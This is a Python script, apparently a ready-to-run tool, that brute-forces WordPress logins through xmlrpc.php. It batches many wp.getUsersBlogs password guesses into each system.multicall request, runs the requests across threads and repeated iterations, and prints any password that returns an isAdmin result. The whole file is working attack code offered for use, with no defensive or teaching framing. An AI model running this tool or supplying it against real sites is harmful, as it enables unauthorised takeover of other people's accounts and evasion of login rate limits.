import requests
from queue import Queue
from threading import Lock, Event
import xml.sax.saxutils as saxutils
import xml.etree.ElementTree as ET
from concurrent.futures import ThreadPoolExecutor, as_completed
import time
import sys


class XMLRPCAttack:
    def __init__(self, target_url, username, passwords_file_path, batch_size, threads, delay, iterations):
        self.target_url = target_url if target_url.endswith('/') else target_url + '/'
        self.username = username
        self.passwords_file_path = passwords_file_path
        self.batch_size = int(batch_size)
        self.threads = int(threads)
        self.delay = int(delay)
        self.iterations = int(iterations)

        self.password_queue = Queue()
        self.lock = Lock()
        self.found = Event()

        self.payload = '''<?xml version="1.0"?>
  <methodCall>
    <methodName>system.multicall</methodName>
    <params>
      <param>
        <value>
          <array>
            <data>
              {}
            </data>
          </array>
        </value>
      </param>
    </params>
  </methodCall>'''
        self.login_attempt_payload = '''
              <value>
                <struct>
                  <member>
                    <name>methodName</name>
                    <value>
                      <string>wp.getUsersBlogs</string>
                    </value>
                  </member>
                  <member>
                    <name>params</name>
                    <value>
                      <array>
                        <data>
                          <value>
                            <array>
                              <data>
                                <value>
                                  <string>{}</string>
                                </value>
                                <value>
                                  <string>{}</string>
                                </value>
                              </data>
                            </array>
                          </value>
                        </data>
                      </array>
                    </value>
                  </member>
                </struct>
              </value>'''

    def read_passwords_file_path(self):
        with open(self.passwords_file_path) as file:
            for line in file.readlines():
                self.password_queue.put(saxutils.escape(line.strip()))

    def prepare_payload(self, passwords):
        login_attempts = ''''''

        for password in passwords:
            login_attempts += self.login_attempt_payload.format(self.username, password)

        payload = self.payload.format(login_attempts)

        return payload

    def send_request(self):
        headers = {
            'Content-Type': 'text/xml',
        }
        batch_size = self.batch_size
        passwords_batch = [self.password_queue.get() for _ in range(min(batch_size, self.password_queue.qsize()))]
        data = self.prepare_payload(passwords_batch)
        response = requests.post(self.target_url + 'xmlrpc.php/', headers=headers, data=data)
        if response.status_code == 500:
            return
        with self.lock:
            if self.found.is_set():
                return
            print(response.status_code)

        xml_response = response.text
        root = ET.fromstring(xml_response)

        results = []
        found = False
        result_index = 0
        result = ''

        try:
            for index, value in enumerate(root.findall('.//value/struct')):
                fault_string = None
                fault_code = None
                is_admin = None

                try:
                    fault_code = value.find('.//member[name=\'faultCode\']/value/int').text
                    fault_string = value.find('.//member[name=\'faultString\']/value/string').text
                except Exception:
                    is_admin = value.find('.//member[name=\'isAdmin\']/value/boolean').text

                if fault_string and fault_code and 'Incorrect username or password.' in fault_string:
                    results.append((passwords_batch[index], fault_code, fault_string))
                else:
                    if is_admin:
                        self.found.set()
                        found = True
                        result_index = index
                        result = passwords_batch[index]
                        break
        except Exception as e:
            print(e)
            return

        if found:
            print('found')
            print(result_index)
            print(saxutils.unescape(result))
        else:
            with self.lock:
                if self.found.is_set():
                    return
                for result in results:
                    print(result)

    def send_requests(self):
        for i in range(self.iterations):
            if self.found.is_set():
                break
            with ThreadPoolExecutor(max_workers=self.threads) as executor:
                futures = [executor.submit(self.send_request) for _ in range(self.threads)]
                for future in as_completed(futures):
                    try:
                        future.result()
                    except Exception:
                        continue
                    if self.found.is_set():
                        break
            time.sleep(self.delay)

    def start(self):
        self.read_passwords_file_path()
        self.send_requests()


xml_rpc_attack = XMLRPCAttack(sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4], sys.argv[5], sys.argv[6], sys.argv[7])
xml_rpc_attack.start()
